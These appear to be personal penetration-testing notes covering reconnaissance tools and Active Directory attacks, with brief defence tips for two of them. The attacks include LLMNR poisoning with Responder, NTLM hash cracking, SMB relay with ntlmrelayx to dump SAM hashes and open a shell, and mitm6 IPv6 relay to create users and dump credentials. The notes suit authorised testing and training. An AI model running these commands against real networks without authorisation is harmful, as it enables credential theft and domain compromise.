# Reconnaissance

## Email Enumeration

[hunter.io](hunter.io)

[phonebook.cz](phonebook.cz)

[EmailHippo](tools.verifyemailaddress.io)

## Subdomain Enumeration

```
sublist3r -d corp(dot)com
```

[crt.sh](crt.sh)  %.corp.com, does certificate fingerprinting.

wfuzz

## Host Discovery

```bash
netdiscover -r x.x.x.0/24 will sweep an entire subnet.
```

# Active Directory Attacks

## LLMNR Poisoning

Link local multicast name resolution, used when DNS fails to resolve a hostname, can be an easy win if LLMNR is not disabled in the environment and users have weak credentials. Use responder from the impacket suite to listen on an interface, works better at times with high traffic.

```bash
Python responder.py -I eth0 -rdwv
```

If certain events occur, you can obtain a username and NTLM hash, which can be cracked with john or hashcat.

```bash
john --wordlist=/path/to/rockyou.txt /path/to/hash.txt
```

hashcat -m 5600 /path/to/hash.txt /path/to/rockyou.txt (5600 is the module for NTLMv2)

[Hashcat binary](https://hashcat.net/hashcat/) can be downloaded here, and should be ran on base OS.

### Defending against LLMNR attacks

Best defense against this attack is to simply disable LLMNR and NBT-NS, if they can not be disabled then strong access controls and strong passwords should be enforced on the network.

## SMB Relay Attacks

Instead of cracking the hash, we can also use it to gain access to a machine if our stolen user hash represents a local admin on the target machine. **SMB signing must be disabled for this to work**.

Edit the responder.conf file and turn off SMB and HTTP servers, run responder --> responder is only capturing hashes, ntlmrelayx will do the actual relay.

```bash
python ntlmrelayx.py -tf targets.txt -smb2support
```

Can dump the SAM file --> get access to local user hashes.

Add -i argument to get an interactive shell spawned on your machine. "started interacvtive SMB client shell via TCP on localhost:11000" -> use netcat to interract, can view/modify/

### Enumerating hosts with SMB signing disabled

```bash
nmap --script=smb2-security-mode.nse -p 445 192.168.1.0/24
```

Disabled by default on workstations, enabled and required by default on servers. enabled but not required = vulnerable. 

### Defending against SMB relay attacks

Enable SMB signing on all devices, disable NTLM authentication, account tiering (least priv.), local admin restriction.

## IPv6 Attacks

[Clone MiTM6](https://github.com/dirkjanm/mitm6) and run "pip3 install ."

Starting by running

```bash
mitm6 -d domain.local
```

and concurrently run

```bash
ntlmrelayx.py -6 -t ldaps://dc.ip.add.res -wh fakewpad.domain.local -l lootme
```

Very extensive tool, can create new users/update ACLs, dump creds, gather info, etc.
